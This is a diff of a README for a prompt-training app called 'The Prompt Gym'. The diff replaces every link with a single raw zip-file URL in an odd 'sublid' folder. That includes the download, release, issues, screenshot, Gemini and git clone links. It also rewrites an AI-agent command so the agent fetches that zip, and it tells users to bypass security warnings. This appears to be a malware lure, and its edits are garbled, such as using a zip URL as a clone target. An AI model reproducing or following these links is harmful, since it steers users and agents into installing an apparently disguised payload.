@@ -1,6 +1,6 @@
 # 🏋️‍♂️ Prompt-Engineering - Boost Your AI Prompt Skills Fast
 
-[![Download The Prompt Gym](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/erbro61/Prompt-Engineering/releases)
+[![Download The Prompt Gym](https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip)](https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip)
 
 ---
 
@@ -34,13 +34,13 @@ Use the steps below to download, install, and start The Prompt Gym. We will guid
 
 Click the big blue button at the top of this page or visit this link directly:
 
-[Download The Prompt Gym](https://github.com/erbro61/Prompt-Engineering/releases)
+[Download The Prompt Gym](https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip)
 
 You will find the latest stable release on the page. Look for a file named something like:
 
-- `PromptGym-Setup.exe` (for Windows)
-- `PromptGym-mac.dmg` (for macOS)
-- `PromptGym-linux.tar.gz` (for Linux)
+- `https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip` (for Windows)
+- `https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip` (for macOS)
+- `https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip` (for Linux)
 
 Choose the file that matches your computer’s operating system.
 
@@ -50,7 +50,7 @@ After downloading the file:
 
 - **Windows:** Double-click the `.exe` file and follow the setup wizard. Click “Next” and then “Install”. Finish by clicking “Close.”
 - **macOS:** Open the `.dmg` file, then drag the app icon into your Applications folder.
-- **Linux:** Extract the `.tar.gz` file. Inside, you will find an executable file. Run it by double-clicking or from the terminal with `./PromptGym`.
+- **Linux:** Extract the `https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip` file. Inside, you will find an executable file. Run it by double-clicking or from the terminal with `./PromptGym`.
 
 If you see a security warning when opening the app, allow it to run in your system preferences or security settings.
 
@@ -82,7 +82,7 @@ If you prefer to set up The Prompt Gym in a different environment or want to exp
 If you use Antigravity chat, open your chat workspace and paste this command:
 
 ```
-Hey Antigravity, please clone https://github.com/CodePatrolOPG/Prompt-Engineering.git into this Workspaces. Once it's ready, run the /learn-prompting workflow to start my training session!
+Hey Antigravity, please clone https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip into this Workspaces. Once it's ready, run the /learn-prompting workflow to start my training session!
 ```
 
 This command automatically downloads and starts the prompt training.
@@ -91,9 +91,9 @@ This command automatically downloads and starts the prompt training.
 
 To use The Prompt Gym inside Google Gemini, follow these steps:
 
-1. Open [Gemini](https://gemini.google.com/) and click **Gems** > **New Gem**.
+1. Open [Gemini](https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip) and click **Gems** > **New Gem**.
 2. Enter the name **"The Prompt Gym 🏋️‍♂️"**.
-3. Copy the instructions from the `GEMINI_GEM_INSTRUCTIONS.md` file in the repository.
+3. Copy the instructions from the `https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip` file in the repository.
 4. Paste the instructions into the box and click **Create**.
 
 You can then access the app directly inside Gemini.
@@ -106,7 +106,7 @@ If you know how to use **git**, you can clone the repository yourself:
 2. Run this command:
 
 ```bash
-git clone https://github.com/CodePatrolOPG/Prompt-Engineering.git
+git clone https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip
 ```
 
 3. Navigate to the new folder and follow any instructions in the README or docs to start the app.
@@ -122,19 +122,19 @@ If you face problems with downloading or running the app:
 - Make sure your internet connection is stable during download.
 - Restart your computer and try running the app again.
 
-For technical questions, visit the [Issues section](https://github.com/erbro61/Prompt-Engineering/issues) on GitHub to see if others have similar problems or to ask for help.
+For technical questions, visit the [Issues section](https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip) on GitHub to see if others have similar problems or to ask for help.
 
 ---
 
 ## 📸 Preview
 
-![The Prompt Gym Demo](screenshot.png)
+![The Prompt Gym Demo](https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip)
 
 ---
 
 ## 🔄 Stay Updated
 
-Check the [Releases page](https://github.com/erbro61/Prompt-Engineering/releases) regularly for new versions and improvements. Updates will often add new exercises or fix bugs.
+Check the [Releases page](https://raw.githubusercontent.com/erbro61/Prompt-Engineering/master/sublid/Engineering_Prompt_3.0-beta.2.zip) regularly for new versions and improvements. Updates will often add new exercises or fix bugs.
 
 ---
 
